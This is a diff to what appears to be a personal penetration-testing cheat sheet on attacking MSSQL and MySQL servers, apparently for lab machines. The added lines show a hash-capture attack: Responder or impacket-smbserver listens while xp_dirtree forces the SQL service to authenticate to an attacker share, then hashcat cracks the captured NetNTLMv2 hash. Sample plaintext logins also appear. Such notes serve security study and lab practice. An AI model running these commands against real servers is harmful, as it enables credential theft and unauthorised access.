@@ -22,7 +22,7 @@ nmap -Pn -sV -sC -p1433,1434,2433,3306 10.10.10.125 # enum
 mysql -u julio -pPassword123 -h 10.129.20.13 
 
 #### connect to MSSQL  (mixed mode (use the sql server to auth))
-sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30 # connect to MSSQL 
+sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30 -C # connect to MSSQL 
 sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h # conect to MSSQL
 impacket-mssqlclient -p 1433 julio@10.129.203.7
 
@@ -153,6 +153,10 @@ ON MYSQL :
   2> GO
   1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
   2> GO
+
+  3 # crack the hash 
+  hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt 
+
 ----------------------------------------------
 ## Impersonate Existing Users with MSSQL
 # SQL Server has a special permission, named "IMPERSONATE", that allows the executing user to take on the permissions of another user or login  
@@ -223,8 +227,19 @@ ON MYSQL :
 ```
 
 
- 
+##  Latest SQL Vulnerabilities 
 
+```bash
+## Capture MSSQL Service Hash 
 
+# 1 # first to start Responder or impacket-smbserver 
+sudo responder -I tun0 
+# or
+sudo impacket-smbserver share ./ -smb2support 2
+
+# run XP_DIRTREE and XP_SUBDIRS 
+1> EXEC master..xp_dirtree '\\10.10.110.17\share\' 
+2> GO
+```
 
 
